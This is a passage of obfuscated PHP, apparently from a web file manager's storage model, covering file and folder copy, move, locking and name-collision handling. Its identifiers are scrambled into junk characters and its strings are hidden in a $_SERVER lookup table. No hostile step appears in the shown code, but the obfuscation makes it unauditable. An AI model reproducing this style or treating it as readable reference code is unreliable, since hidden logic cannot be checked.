0); $îÕíîŞ = array_reverse($this->parentLevelArray($ÇÛ¦Î¥¦[$Ö¿×Ÿ‡ê[549]])); foreach ($îÕíîŞ as $Á¬¢¯ëÉ) { $Ù¯ÏßÇ‘ = $ñ–éè¦ . $Ö¿×Ÿ‡ê[593] . $Á¬¢¯ëÉ; if (CacheLock::lockGet($Ö¿×Ÿ‡ê[594] . $Ù¯ÏßÇ‘)) { $ÇÛ¦Î¥¦ = $this->sourceInfo($Á¬¢¯ëÉ); CacheLock::setErrorMsg($Ö¿×Ÿ‡ê[162] . htmlspecialchars($ÇÛ¦Î¥¦[$Ö¿×Ÿ‡ê[32]]) . $Ö¿×Ÿ‡ê[164] . $•»®ÈûÓ); $this->_lockKey($Ù¯ÏßÇ‘, 1); $this->_lockKey($Ù¯ÏßÇ‘, 0); } } } private function _lockCheckEnd($óŠ²…»õ, $£ĞêøÏ˜) { $šù€àÚ“ =& $_SERVER[¡“ËÌ§œ]; $ ³óŠƒë = $óŠ²…»õ . $šù€àÚ“[10] . $£ĞêøÏ˜; CacheLock::setErrorMsg($šù€àÚ“[407]); if (!isset($this->_lockTimeStart[$ ³óŠƒë])) { return; } $í‰œ˜Õ = timeFloat() - $this->_lockTimeStart[$ ³óŠƒë]; unset($this->_lockTimeStart[$ ³óŠƒë]); if ($í‰œ˜Õ > 0.5) { unset(self::$cacheSourceInfo[$šù€àÚ“[498] . $£ĞêøÏ˜]); } $ê³Ü¯ú = $this->sourceInfo($£ĞêøÏ˜); if (!$ê³Ü¯ú) { show_json(LNG($šù€àÚ“[105]), !1); } } private function _lockParent($ÊìáØİĞ, $·Ğ¿Äà, $ º¤İ´‘) { if (!$this->autoLockSet) { return; } $¼’é®¦ê = $this->sourceInfo($ÊìáØİĞ); if (!is_array($¼’é®¦ê)) { return; } $²êÌäñ© = array_reverse($this->parentLevelArray($¼’é®¦ê[$_SERVER[¡“ËÌ§œ][549]])); foreach ($²êÌäñ© as $Ô×°›õ½) { $this->_lockEvent($Ô×°›õ½, $·Ğ¿Äà, $ º¤İ´‘); } } private function _lockEvent($’õöŒÚå, $½àèÓ¤ı, $€¾õöÉ) { $ÇÜºõª =& $_SERVER[¡“ËÌ§œ]; if (!$this->autoLockSet) { return; } foreach ($½àèÓ¤ı as $÷çŞ—¯ˆ) { $ßï¾ÁÜ = $÷çŞ—¯ˆ . $ÇÜºõª[10] . $’õöŒÚå; if ($€¾õöÉ && CacheLock::lockGet($ÇÜºõª[594] . $ßï¾ÁÜ)) { continue; } $this->_lockKey($ßï¾ÁÜ, $€¾õöÉ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¹£Æˆï, $•÷ÑİÆä = 1) { $Ş˜³ßÄ = $_SERVER[¡“ËÌ§œ][594] . md5($¹£Æˆï); if ($•÷ÑİÆä) { if (isset(self::$_lockItemArr[$Ş˜³ßÄ])) { return; } self::$_lockItemArr[$Ş˜³ßÄ] = 1; CacheLock::lock($Ş˜³ßÄ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ş˜³ßÄ])) { return; } unset(self::$_lockItemArr[$Ş˜³ßÄ]); CacheLock::unlock($Ş˜³ßÄ); } } public function isParentOf($·ºëÆ·, $ÔÈÆáåó) { $´€˜®Éİ =& $_SERVER[¡“ËÌ§œ]; $¿¨Úèæß = $this->sourceInfo($·ºëÆ·); $‚ËÔõó¶ = $this->sourceInfo($ÔÈÆáåó); $¿‘úãæª = $¿¨Úèæß[$´€˜®Éİ[549]] . $¿¨Úèæß[$´€˜®Éİ[440]] . $´€˜®Éİ[50]; $à–¿èŠÛ = $‚ËÔõó¶[$´€˜®Éİ[549]] . $‚ËÔõó¶[$´€˜®Éİ[440]] . $´€˜®Éİ[50]; $Ò•à­º = strpos($à–¿èŠÛ, $¿‘úãæª) === 0; return $Ò•à­º; } private $targetIsDelete = 0; public function copy($‡•ªÁ—, $’¡ó×¼, $È¶‡¡Ô = REPEAT_REPLACE, $¾—è‚¿ = '') { $òµ¸Æ´ =& $_SERVER[¡“ËÌ§œ]; $¨÷Ê£® = $this->sourceInfo($‡•ªÁ—); $²ÄÎñ«¿ = $this->sourceInfo($’¡ó×¼); if (!$¨÷Ê£® || !$²ÄÎñ«¿ || $²ÄÎñ«¿[$òµ¸Æ´[448]] != $òµ¸Æ´[88]) { return !1; } if ($this->isParentOf($‡•ªÁ—, $’¡ó×¼)) { return !1; } $á›™šÎş = $¾—è‚¿ ? $¾—è‚¿ : $¨÷Ê£®[$òµ¸Æ´[32]]; $this->lockCopyStart($‡•ªÁ—); $this->lockWriteStart($’¡ó×¼, $á›™šÎş); $ü÷ŒÅœŠ = array($òµ¸Æ´[595] => array(), $òµ¸Æ´[596] => array(), $òµ¸Æ´[597] => array()); $this->targetIsDelete = intval($¨÷Ê£®[$òµ¸Æ´[469]]); $–¿¿ˆª = $this->fileNameExistCache($’¡ó×¼, $¨÷Ê£®[$òµ¸Æ´[32]]); $¹€Ã¯å = $this->_copy($‡•ªÁ—, $’¡ó×¼, $È¶‡¡Ô, $ü÷ŒÅœŠ, !0, $¾—è‚¿); $this->_childrenListClear(); $this->lockCopyEnd($‡•ªÁ—); $this->lockWriteEnd($’¡ó×¼, $á›™šÎş); if ($¨÷Ê£®[$òµ¸Æ´[448]] == $òµ¸Æ´[88] && $–¿¿ˆª == $¹€Ã¯å) { $this->folderSizeResetChildren($–¿¿ˆª); } Model($òµ¸Æ´[598])->addAll($ü÷ŒÅœŠ[$òµ¸Æ´[596]], array(), !0); if ($–¿¿ˆª != $¹€Ã¯å || $¨÷Ê£®[$òµ¸Æ´[448]] == $òµ¸Æ´[88]) { Model($òµ¸Æ´[599])->eventCopy($¹€Ã¯å); } $this->saveAll($ü÷ŒÅœŠ[$òµ¸Æ´[597]]); Model($òµ¸Æ´[200])->linkAdd($ü÷ŒÅœŠ[$òµ¸Æ´[595]]); $this->folderSizeReset($’¡ó×¼); $this->updateModifyTime($’¡ó×¼); return $¹€Ã¯å; } private function _copy($¯ë¹É™Ù, $®åˆ¥²º, $Ş¥½äÜÍ, &$¾¯ÃŠÖ, $çµ¢‰üÇ, $Èİ°£Ï = '') { $ïëìÆ¹Ø =& $_SERVER[¡“ËÌ§œ]; $¥ûˆö© = $this->sourceInfoCache($¯ë¹É™Ù); $ğ ’üÔ = $¥ûˆö©[$ïëìÆ¹Ø[448]] == $ïëìÆ¹Ø[88]; $÷ÍÙˆÁ = $Èİ°£Ï ? $Èİ°£Ï : $¥ûˆö©[$ïëìÆ¹Ø[32]]; $¹ùôéç× = $this->fileNameExistCache($®åˆ¥²º, $÷ÍÙˆÁ); if ($çµ¢‰üÇ) { $this->_childrenAllMake($¯ë¹É™Ù); if ($ğ ’üÔ && $¹ùôéç×) { $this->_childrenAllMake($¹ùôéç×); } } if (!$¹ùôéç×) { return $this->_copyCreate($¯ë¹É™Ù, $®åˆ¥²º, $÷ÍÙˆÁ, $¾¯ÃŠÖ); } $ïûä”¿ğ = $¹ùôéç×; if ($ğ ’üÔ) { if ($Ş¥½äÜÍ == REPEAT_RENAME_FOLDER) { $÷ÍÙˆÁ = $this->fileNameAutoCache($®åˆ¥²º, $÷ÍÙˆÁ, $Ş¥½äÜÍ, $ğ ’üÔ); $ïûä”¿ğ = $this->_copyCreate($¯ë¹É™Ù, $®åˆ¥²º, $÷ÍÙˆÁ, $¾¯ÃŠÖ); } else { $ó´¯Ìàâ = $this->_childrenList($¯ë¹É™Ù); foreach ($ó´¯Ìàâ as $ÛòòÃ¤à) { $this->_copy($ÛòòÃ¤à[$ïëìÆ¹Ø[440]], $¹ùôéç×, $Ş¥½äÜÍ, $¾¯ÃŠÖ, !1); } } } else { if ($Ş¥½äÜÍ == REPEAT_RENAME || $Ş¥½äÜÍ == REPEAT_RENAME_FOLDER) { $÷ÍÙˆÁ = $this->fileNameAutoCache($®åˆ¥²º, $÷ÍÙˆÁ, $Ş¥½äÜÍ, $ğ ’üÔ); $ïûä”¿ğ = $this->_copyCreate($¯ë¹É™Ù, $®åˆ¥²º, $÷ÍÙˆÁ, $¾¯ÃŠÖ); } else { if ($Ş¥½äÜÍ == REPEAT_REPLACE) { $äÈı©ÏŒ = $this->sourceInfoCache($¹ùôéç×); $ÑĞ­¤÷ı = $this->fileHistory($äÈı©ÏŒ, $¥ûˆö©[$ïëìÆ¹Ø[506]], $¥ûˆö©[$ïëìÆ¹Ø[76]]); if ($ÑĞ­¤÷ı) { $¾¯ÃŠÖ[$ïëìÆ¹Ø[595]][] = $¥ûˆö©[$ïëìÆ¹Ø[506]]; } } else { if ($Ş¥½äÜÍ == REPEAT_SKIP) { } } } Hook::trigger($ïëìÆ¹Ø[600], array($ïëìÆ¹Ø[601], $¥ûˆö©, 0)); } return $ïûä”¿ğ; } private function _copyCreate($»«ë˜¥û, $ˆ—ò‘Û¾, $Ö¦«í¯, &$”ôå‘ü) { $ ÇÆÀÑ¢ =& $_SERVER[¡“ËÌ§œ]; $¡éêŒ½ô = $this->sourceInfoCache($»«ë˜¥û); $òŠîóš = $this->sourceInfoCache($ˆ—ò‘Û¾); $‘ºÅş²— = $this->_makeItemData($¡éêŒ½ô, $òŠîóš, $Ö¦«í¯); Hook::trigger($ ÇÆÀÑ¢[602], $‘ºÅş²—); Hook::trigger($ ÇÆÀÑ¢[603], array($ ÇÆÀÑ¢[604], $‘ºÅş²—, 0)); $Ç¸¯¢ÕÍ = $this->add($‘ºÅş²—); $ËäÃÎ§¥ = array($ ÇÆÀÑ¢[440] => $Ç¸¯¢ÕÍ, $ ÇÆÀÑ¢[32] => $Ö¦«í¯); $this->_copyApplyMeta($ËäÃÎ§¥, $”ôå‘ü); if ($¡éêŒ½ô[$ ÇÆÀÑ¢[448]] != $ ÇÆÀÑ¢[88]) { $”ôå‘ü[$ ÇÆÀÑ¢[595]][] = $¡éêŒ½ô[$ ÇÆÀÑ¢[506]]; return $Ç¸¯¢ÕÍ; } $´»Áü‹ = array(); $šôØ•Íë = array(); $this->_childrenListAll($»«ë˜¥û, $´»Áü‹); $ÁßÏÀï = count($´»Áü‹); if ($ÁßÏÀï == 0) { return $Ç¸¯¢ÕÍ; } $ü€ì»ËÀ = $this->sourceInfo($Ç¸¯¢ÕÍ); foreach ($´»Áü‹ as $¹Å˜…ùß) { $¯Áã¿² = $this->_makeItemData($¹Å˜…ùß, $ü€ì»ËÀ, $¹Å˜…ùß[$ ÇÆÀÑ¢[32]]); $¯Áã¿²[$ ÇÆÀÑ¢[549]] = $¹Å˜…ùß[$ ÇÆÀÑ¢[549]]; $šôØ•Íë[] = $¯Áã¿²; } $this->chunkEventSet($ ÇÆÀÑ¢[605], array($ ÇÆÀÑ¢[606], $‘ºÅş²—, $ÁßÏÀï)); $this->addAll($šôØ•Íë, array(), !1); $¥’„¯¡¶ = $this->where(array($ ÇÆÀÑ¢[470] => $Ç¸¯¢ÕÍ))->select(); $ƒ“õÁæ = $this->_childrenMakeRelation($´»Áü‹, $¥’„¯¡¶); $ƒ“õÁæ[$»«ë˜¥û] = $Ç¸¯¢ÕÍ; $üç©æ©í = array(); $ «ÌšæĞ = array(); foreach ($¥’„¯¡¶ as $¹Å˜…ùß) { $Õºêš§Ê = $¹Å˜…ùß[$ ÇÆÀÑ¢[440]]; $ûõ×µËÉ = $this->_childrenMatch($ƒ“õÁæ, $¹Å˜…ùß, $ü€ì»ËÀ); $üç©æ©í[] = array($ ÇÆÀÑ¢[440], $Õºêš§Ê, $ ÇÆÀÑ¢[470], $ûõ×µËÉ[$ ÇÆÀÑ¢[470]]); $ «ÌšæĞ[] = array($ ÇÆÀÑ¢[440], $Õºêš§Ê, $ ÇÆÀÑ¢[549], $ûõ×µËÉ[$ ÇÆÀÑ¢[549]]); $this->_copyApplyMeta($¹Å˜…ùß, $”ôå‘ü); if ($¹Å˜…ùß[$ ÇÆÀÑ¢[448]] != $ ÇÆÀÑ¢[88]) { $”ôå‘ü[$ ÇÆÀÑ¢[595]][] = $¹Å˜…ùß[$ ÇÆÀÑ¢[506]]; } } $this->chunkEventSet($ ÇÆÀÑ¢[607], array($ ÇÆÀÑ¢[608], $‘ºÅş²—, $ÁßÏÀï)); $this->saveAll($üç©æ©í); $this->chunkEventSet($ ÇÆÀÑ¢[609], array($ ÇÆÀÑ¢[610], $‘ºÅş²—, $ÁßÏÀï)); $this->saveAll($ «ÌšæĞ); return $Ç¸¯¢ÕÍ; } private function _childrenMakeRelation($¢´±¤Á¬, $×„­Ğ·«) { $è½ØÑıë =& $_SERVER[¡“ËÌ§œ]; $ê…¢ªÉ· = array(); $ıÚáÅÏÌ = array(); foreach ($¢´±¤Á¬ as $¿Øıİñ„) { $«ªäÏ«¸ = $¿Øıİñ„[$è½ØÑıë[32]] . $è½ØÑıë[8] . $¿Øıİñ„[$è½ØÑıë[549]]; $ê…¢ªÉ·[$«ªäÏ«¸] = $¿Øıİñ„[$è½ØÑıë[440]]; } foreach ($×„­Ğ·« as $¿Øıİñ„) { $«ªäÏ«¸ = $¿Øıİñ„[$è½ØÑıë[32]] . $è½ØÑıë[8] . $¿Øıİñ„[$è½ØÑıë[549]]; $÷¹ÛÃÍ‹ = $ê…¢ªÉ·[$«ªäÏ«¸]; $ıÚáÅÏÌ[$÷¹ÛÃÍ‹] = $¿Øıİñ„[$è½ØÑıë[440]]; } return $ıÚáÅÏÌ; } private function _childrenMatch($›å¡‰, $›êü¨ˆç, $ºìàÎœì) { $Í˜çÅ‘Õ =& $_SERVER[¡“ËÌ§œ]; $¥Ó®Œ¨— = $ºìàÎœì[$Í˜çÅ‘Õ[549]]; $£†¤ßœ² = $this->parentLevelArray($›êü¨ˆç[$Í˜çÅ‘Õ[549]]); foreach ($£†¤ßœ² as $ôÃèÄ¾) { if (isset($›å¡‰[$ôÃèÄ¾])) { $¥Ó®Œ¨— .= $›å¡‰[$ôÃèÄ¾] . $Í˜çÅ‘Õ[611]; } } $¥Ó®Œ¨— = rtrim($¥Ó®Œ¨—, $Í˜çÅ‘Õ[50]) . $Í˜çÅ‘Õ[50]; $÷»·€ÊÉ = $this->parentLevelArray($¥Ó®Œ¨—); $Ğ±¦öâÔ = $÷»·€ÊÉ[count($÷»·€ÊÉ) - 1]; return array($Í˜çÅ‘Õ[470] => $Ğ±¦öâÔ, $Í˜çÅ‘Õ[549] => $¥Ó®Œ¨—); } private function _makeItemData($Ïî”âúÑ, $©ÉÕ‹Íß, $éÑØêß¬) { $ûöÇß‹ =& $_SERVER[¡“ËÌ§œ]; $Å•áÒÜ = array($ûöÇß‹[612] => $Ïî”âúÑ[$ûöÇß‹[448]], $ûöÇß‹[458] => $éÑØêß¬, $ûöÇß‹[613] => $Ïî”âúÑ[$ûöÇß‹[450]] ? $Ïî”âúÑ[$ûöÇß‹[450]] : $ûöÇß‹[12], $ûöÇß‹[507] => $Ïî”âúÑ[$ûöÇß‹[506]] ? $Ïî”âúÑ[$ûöÇß‹[506]] : 0, $ûöÇß‹[583] => $Ïî”âúÑ[$ûöÇß‹[76]] ? $Ïî”âúÑ[$ûöÇß‹[76]] : 0, $ûöÇß‹[614] => intval($©ÉÕ‹Íß[$ûöÇß‹[449]]), $ûöÇß‹[615] => intval($©ÉÕ‹Íß[$ûöÇß‹[534]]), $ûöÇß‹[616] => intval(USER_ID), $ûöÇß‹[617] => intval(USER_ID), $ûöÇß‹[439] => intval($©ÉÕ‹Íß[$ûöÇß‹[440]]), $ûöÇß‹[618] => $©ÉÕ‹Íß[$ûöÇß‹[549]] . $©ÉÕ‹Íß[$ûöÇß‹[440]] . $ûöÇß‹[50], $ûöÇß‹[462] => $Ïî”âúÑ[$ûöÇß‹[85]] ? $Ïî”âúÑ[$ûöÇß‹[85]] : time(), $ûöÇß‹[468] => 0, $ûöÇß‹[619] => $ûöÇß‹[12]); return $Å•áÒÜ; } private function _copyApplyMeta($†Äö™›Œ, &$ÄÓñ’û€) { $¨÷„ÕÄ© =& $_SERVER[¡“ËÌ§œ]; $Í„ì…Ã = $†Äö™›Œ[$¨÷„ÕÄ©[440]]; $ñ™ ĞŒ = $†Äö™›Œ[$¨÷„ÕÄ©[32]]; if (!isset($†Äö™›Œ[$¨÷„ÕÄ©[620]]) || !$†Äö™›Œ[$¨÷„ÕÄ©[620]] || $†Äö™›Œ[$¨÷„ÕÄ©[620]] == $¨÷„ÕÄ©[198]) { $ÄÓñ’û€[$¨÷„ÕÄ©[597]][] = array($¨÷„ÕÄ©[440], $Í„ì…Ã, $¨÷„ÕÄ©[620], short_id($Í„ì…Ã)); } if (Input::check($ñ™ ĞŒ, $¨÷„ÕÄ©[621])) { $ÄÓñ’û€[$¨÷„ÕÄ©[596]][] = array($¨÷„ÕÄ©[440] => $Í„ì…Ã, $¨÷„ÕÄ©[94] => $¨÷„ÕÄ©[503], $¨÷„ÕÄ©[403] => str_replace($¨÷„ÕÄ©[53], $¨÷„ÕÄ©[12], Pinyin::get($ñ™ ĞŒ))); $ÄÓñ’û€[$¨÷„ÕÄ©[596]][] = array($¨÷„ÕÄ©[440] => $Í„ì…Ã, $¨÷„ÕÄ©[94] => $¨÷„ÕÄ©[502], $¨÷„ÕÄ©[403] => Pinyin::get($ñ™ ĞŒ, $¨÷„ÕÄ©[622])); } $ÄÓñ’û€[$¨÷„ÕÄ©[596]][] = array($¨÷„ÕÄ©[440] => $Í„ì…Ã, $¨÷„ÕÄ©[94] => $¨÷„ÕÄ©[482], $¨÷„ÕÄ©[403] => KodSort::makeStr($ñ™ ĞŒ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ù”­à­) { $Ú¾…®ÔÕ =& $_SERVER[¡“ËÌ§œ]; $¡îÓñı¸ = $this->sourceInfo($Ù”­à­); $…„”ø°¥ = $Ú¾…®ÔÕ[623]; $©–Ã™Š = array($Ú¾…®ÔÕ[549] => array($Ú¾…®ÔÕ[578], $¡îÓñı¸[$Ú¾…®ÔÕ[549]] . $Ù”­à­ . $Ú¾…®ÔÕ[579]), $Ú¾…®ÔÕ[469] => $this->targetIsDelete); $·¶øİ† = $this->field($…„”ø°¥)->where($©–Ã™Š)->select(); if (!$·¶øİ†) { return; } $·¶øİ† = array_to_keyvalue($·¶øİ†, $Ú¾…®ÔÕ[440]); foreach ($·¶øİ† as $êèˆ·¬¡) { $é‚‘ı = $êèˆ·¬¡[$Ú¾…®ÔÕ[470]]; $Ù”­à­ = $êèˆ·¬¡[$Ú¾…®ÔÕ[440]]; if (!isset($this->_childrenListCache[$Ù”­à­]) && $êèˆ·¬¡[$Ú¾…®ÔÕ[448]] == $Ú¾…®ÔÕ[88]) { $this->_childrenListCache[$Ù”­à­] = array(); } if (!isset($this->_childrenListCache[$é‚‘ı])) { $this->_childrenListCache[$é‚‘ı] = array(); } $this->_childrenListCache[$é‚‘ı][$Ù”­à­] = $êèˆ·¬¡; $this->_childrenItemCache[$Ù”­à­] = $êèˆ·¬¡; } } private function _childrenListAll($ë÷ÕÏÌ¯, &$‘æ£í) { $×¤¬¯ÖÈ =& $_SERVER[¡“ËÌ§œ]; if (!isset($this->_childrenListCache[$ë÷ÕÏÌ¯])) { return; } $»ÆÙ‚É¼ = $this->_childrenListCache[$ë÷ÕÏÌ¯]; foreach ($»ÆÙ‚É¼ as $À´Ú°³¦ => $ŠèöÙ›ƒ) { $‘æ£í[$À´Ú°³¦] = $ŠèöÙ›ƒ; if ($ŠèöÙ›ƒ[$×¤¬¯ÖÈ[448]] == $×¤¬¯ÖÈ[88]) { $this->_childrenListAll($À´Ú°³¦, $‘æ£í); } } } private function sourceInfoCache($É›‚¼÷·) { if (isset($this->_childrenItemCache[$É›‚¼÷·])) { return $this->_childrenItemCache[$É›‚¼÷·]; } return $this->sourceInfo($É›‚¼÷·); } private function _childrenList($ş®×›Õ‰) { if (isset($this->_childrenListCache[$ş®×›Õ‰])) { return $this->_childrenListCache[$ş®×›Õ‰]; } return $this->_childrenListSelect($ş®×›Õ‰); } private function _childrenListSelect($Úˆ’®ú¼) { $÷÷äœÇ’ =& $_SERVER[¡“ËÌ§œ]; $Ò½Ù™¸ = array($÷÷äœÇ’[470] => $Úˆ’®ú¼, $÷÷äœÇ’[469] => $this->targetIsDelete); $¯şéõÏÙ = $this->where($Ò½Ù™¸)->select(); $¯şéõÏÙ = $¯şéõÏÙ ? $¯şéõÏÙ : array(); $¾ı×Áà¬ = array_to_keyvalue($¯şéõÏÙ, $÷÷äœÇ’[440]); $this->_childrenListCache[$Úˆ’®ú¼] = $¾ı×Áà¬; foreach ($¾ı×Áà¬ as $Úˆ’®ú¼ => $íÔ¥÷ë) { $this->_childrenItemCache[$Úˆ’®ú¼] = $íÔ¥÷ë; } return $¾ı×Áà¬; } private function fileNameExistCache($úÕÃ ‚Ò, $¦Ó®ã¥ø) { $Å¹îõŠ¯ =& $_SERVER[¡“ËÌ§œ]; $¦Ó®ã¥ø = strtolower($¦Ó®ã¥ø); $ïÉÓµÑ— = $this->_childrenList($úÕÃ ‚Ò); foreach ($ïÉÓµÑ— as $Î¬ÊÑØ´) { if ($¦Ó®ã¥ø == strtolower($Î¬ÊÑØ´[$Å¹îõŠ¯[32]])) { return $Î¬ÊÑØ´[$Å¹îõŠ¯[440]]; } } return !1; } private function fileNameAutoCache($Š†íÅãÖ, $›¦Åàé, $Å²Ìæ…„, $ˆÏËÆŞ) { $Å˜ç©”Ò =& $_SERVER[¡“ËÌ§œ]; $Â÷™ì”® = $this->_childrenList($Š†íÅãÖ); $òñü½ˆ = array_to_keyvalue($Â÷™ì”®, $Å˜ç©”Ò[12], $Å˜ç©”Ò[32]); return $this->fileNameAutoGet($òñü½ˆ, $›¦Åàé, $Å²Ìæ…„, $ˆÏËÆŞ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ŞİÕº¨ƒ, $Üõ–šÉà, $¢¼æå© = REPEAT_REPLACE, $¤ş”ùªì = '') { $¸ã¾¬Ûá =& $_SERVER[¡“ËÌ§œ]; $­ä‰ˆÇ = $this->sourceInfo($ŞİÕº¨ƒ); $à¿äˆ“ = $this->sourceInfo($Üõ–šÉà); if ($­ä‰ˆÇ[$¸ã¾¬Ûá[470]] == $à¿äˆ“[$¸ã¾¬Ûá[440]]) { if ($­ä‰ˆÇ[$¸ã¾¬Ûá[469]] == $¸ã¾¬Ûá[88]) { Model($¸ã¾¬Ûá[467])->restore(array($ŞİÕº¨ƒ)); } if (!$¤ş”ùªì || $¤ş”ùªì == $­ä‰ˆÇ[$¸ã¾¬Ûá[32]]) { return $ŞİÕº¨ƒ; } } $»Ï‹¿¯ñ = $this->pathInfoMore($ŞİÕº¨ƒ); if ($this->isParentOf($ŞİÕº¨ƒ, $Üõ–šÉà)) { return !1; } if (!$­ä‰ˆÇ || !$à¿äˆ“ || $à¿äˆ“[$¸ã¾¬Ûá[448]] != $¸ã¾¬Ûá[88]) { return !1; } Hook::trigger($¸ã¾¬Ûá[624], $»Ï‹¿¯ñ); $this->targetIsDelete = intval($­ä‰ˆÇ[$¸ã¾¬Ûá[469]]); if ($­ä‰ˆÇ[$¸ã¾¬Ûá[470]] == $Üõ–šÉà && $¤ş”ùªì != $­ä‰ˆÇ[$¸ã¾¬Ûá[32]]) { $ßæ¨ç¹š = $this->fileNameExist($Üõ–šÉà, $¤ş”ùªì); if ($ßæ¨ç¹š && $­ä‰ˆÇ[$¸ã¾¬Ûá[448]] == $¸ã¾¬Ûá[198]) { $Ö¿“×ÎÊ = $this->sourceInfo($ßæ¨ç¹š); $ŞÎ¬”¨Â = $this->fileHistory($Ö¿“×ÎÊ, $­ä‰ˆÇ[$¸ã¾¬Ûá[506]], $­ä‰ˆÇ[$¸ã¾¬Ûá[76]]); if (!$ŞÎ¬”¨Â) { Model($¸ã¾¬Ûá[509])->remove($­ä‰ˆÇ[$¸ã¾¬Ûá[506]]); } $this->removeNow($ŞİÕº¨ƒ, !1); $this->folderSizeReset($Üõ–šÉà); Hook::trigger($¸ã¾¬Ûá[625], $»Ï‹¿¯ñ); return $ßæ¨ç¹š; } } $’Ú°°ô = $¤ş”ùªì ? $¤ş”ùªì : $­ä‰ˆÇ[$¸ã¾¬Ûá[32]]; $this->lockMoveStart($ŞİÕº¨ƒ); $this->lockWriteStart($Üõ–šÉà, $’Ú°°ô); $Œœ£³ Ú = array($¸ã¾¬Ûá[595] => array(), $¸ã¾¬Ûá[626] => !1); $this->clearShare($ŞİÕº¨ƒ, $Üõ–šÉà); $Şª×÷€ñ = $this->fileNameExistCache($Üõ–šÉà, $­ä‰ˆÇ[$¸ã¾¬Ûá[32]]); $ÑÉÓ¿İŒ = $this->_move($ŞİÕº¨ƒ, $Üõ–šÉà, $¢¼æå©, $Œœ£³ Ú, $¤ş”ùªì); $this->sourceCacheClear(); if ($­ä‰ˆÇ[$¸ã¾¬Ûá[448]] == $¸ã¾¬Ûá[88] && $Şª×÷€ñ) { $this->folderSizeResetChildren($ÑÉÓ¿İŒ); } Model($¸ã¾¬Ûá[200])->linkAdd($Œœ£³ Ú[$¸ã¾¬Ûá[595]]); if ($Şª×÷€ñ && $Œœ£³ Ú[$¸ã¾¬Ûá[626]]) { $this->removeNow($ŞİÕº¨ƒ, !1); } $this->lockMoveEnd($ŞİÕº¨ƒ); $this->lockWriteEnd($Üõ–šÉà, $’Ú°°ô); $this->folderSizeReset($­ä‰ˆÇ[$¸ã¾¬Ûá[470]]); $this->folderSizeReset($Üõ–šÉà); $Ş–øÂÙ™ = array($­ä‰ˆÇ[$¸ã¾¬Ûá[470]], $Üõ–šÉà); if ($­ä‰ˆÇ[$¸ã¾¬Ûá[448]] == $¸ã¾¬Ûá[88]) { $Ş–øÂÙ™[] = $ŞİÕº¨ƒ; } $this->updateModifyTime($Ş–øÂÙ™); Model($¸ã¾¬Ûá[599])->eventMove($ŞİÕº¨ƒ, $­ä‰ˆÇ[$¸ã¾¬Ûá[470]], $Üõ–šÉà); Hook::trigger($¸ã¾¬Ûá[625], $»Ï‹¿¯ñ); return $ÑÉÓ¿İŒ; } private function _move($£§« ñè, $–îªŸŸ, $ë³Ş£ß, &$—ïÈºÚ¦, $’±‹Â‘„ = '') { $õ—™µÙ =& $_SERVER[¡“ËÌ§œ]; $°æ¾‚îğ = $this->sourceInfo($£§« ñè); $ªÏËúÍ÷ = $°æ¾‚îğ[$õ—™µÙ[448]] == $õ—™µÙ[88]; $İŒÁ´§ñ = $’±‹Â‘„ ? $’±‹Â‘„ : $°æ¾‚îğ[$õ—™µÙ[32]]; $§´…¶€ = $this->fileNameExistCache($–îªŸŸ, $İŒÁ´§ñ); $this->lockMoveStart($£§« ñè); $this->lockWriteStart($–îªŸŸ, $İŒÁ´§ñ); if (!$§´…¶€) { return $this->_moveForce($£§« ñè, $–îªŸŸ, $İŒÁ´§ñ); } $âäñÆşå = $§´…¶€; $‘•êÖ´³ = !1; if ($ªÏËúÍ÷) { if ($ë³Ş£ß == REPEAT_RENAME_FOLDER) { $İŒÁ´§ñ = $this->fileNameAuto($–îªŸŸ, $İŒÁ´§ñ, $ë³Ş£ß, $ªÏËúÍ÷); $âäñÆşå = $this->_moveForce($£§« ñè, $–îªŸŸ, $İŒÁ´§ñ); } else { if ($ë³Ş£ß == REPEAT_RENAME_FOLDER) { $ë³Ş£ß = REPEAT_RENAME; } $İ¾±“ıÔ = $this->_childrenListSelect($£§« ñè); foreach ($İ¾±“ıÔ as $öè†ï›Í) { $this->_move($öè†ï›Í[$õ—™µÙ[440]], $§´…¶€, $ë³Ş£ß, $—ïÈºÚ¦); } $‘•êÖ´³ = !0; } } else { if ($ë³Ş£ß == REPEAT_SKIP) { $‘•êÖ´³ = !0; } else { if ($ë³Ş£ß == REPEAT_RENAME || $ë³Ş£ß == REPEAT_RENAME_FOLDER) { $İŒÁ´§ñ = $this->fileNameAuto($–îªŸŸ, $İŒÁ´§ñ, $ë³Ş£ß, $ªÏËúÍ÷); $âäñÆşå = $this->_moveForce($£§« ñè, $–îªŸŸ, $İŒÁ´§ñ); } else { if ($ë³Ş£ß == REPEAT_REPLACE) { $È„¦½© = $this->sourceInfoCache($§´…¶€); $¡Ü¡Ãã« = $this->fileHistory($È„¦½©, $°æ¾‚îğ[$õ—™µÙ[506]], $°æ¾‚îğ[$õ—™µÙ[76]]); $‘•êÖ´³ = !0; if ($¡Ü¡Ãã«) { $—ïÈºÚ¦[$õ—™µÙ[595]][] = $°æ¾‚îğ[$õ—™µÙ[506]]; } } } } } if ($‘•êÖ´³ && !$—ïÈºÚ¦[$õ—™µÙ[626]]) { $—ïÈºÚ¦[$õ—™µÙ[626]] = !0; } return $âäñÆşå; } private function _moveForce($¬ÁÎ™, $£¯Ó‘‰, $Û±ÅûÌ) { $–ÇóÛÎÆ =& $_SERVER[¡“ËÌ§œ]; $õ¹¿™§û = $this->sourceInfo($¬ÁÎ™); $íÊŸôı = $this->sourceInfo($£¯Ó‘‰); $³Åî×ˆ = $õ¹¿™§û[$–ÇóÛÎÆ[448]] == $–ÇóÛÎÆ[88]; $ÁÄ®‹è¡ = array($–ÇóÛÎÆ[439] => $íÊŸôı[$–ÇóÛÎÆ[440]], $–ÇóÛÎÆ[618] => $íÊŸôı[$–ÇóÛÎÆ[549]] . $íÊŸôı[$–ÇóÛÎÆ[440]] . $–ÇóÛÎÆ[50], $–ÇóÛÎÆ[614] => $íÊŸôı[$–ÇóÛÎÆ[449]], $–ÇóÛÎÆ[615] => $íÊŸôı[$–ÇóÛÎÆ[534]], $–ÇóÛÎÆ[617] => USER_ID, $–ÇóÛÎÆ[458] => $Û±ÅûÌ); $Ü¦«•’ = $õ¹¿™§û[$–ÇóÛÎÆ[449]] == SourceModel::TYPE_GROUP && 